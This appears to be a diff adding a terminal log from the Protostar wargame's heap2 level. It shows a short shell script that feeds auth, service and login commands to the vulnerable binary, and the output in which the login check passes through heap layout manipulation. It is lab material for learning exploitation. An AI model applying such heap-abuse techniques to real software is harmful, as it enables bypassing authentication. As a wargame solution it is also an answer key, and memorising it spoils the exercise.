@@ -1,0 +1,18 @@
+user@protostar:/tmp/heap$ more heap2.sh 
+#!/bin/sh
+
+/opt/protostar/bin/heap2 <<EOF
+auth ABCD
+service 123
+service 123
+login
+EOF
+
+user@protostar:/tmp/heap$ ./heap2.sh 
+[ auth = (nil), service = (nil) ]
+[ auth = 0x804c008, service = (nil) ]
+[ auth = 0x804c008, service = 0x804c018 ]
+[ auth = 0x804c008, service = 0x804c028 ]
+you have logged in already!
+[ auth = 0x804c008, service = 0x804c028 ]
+user@protostar:/tmp/heap$
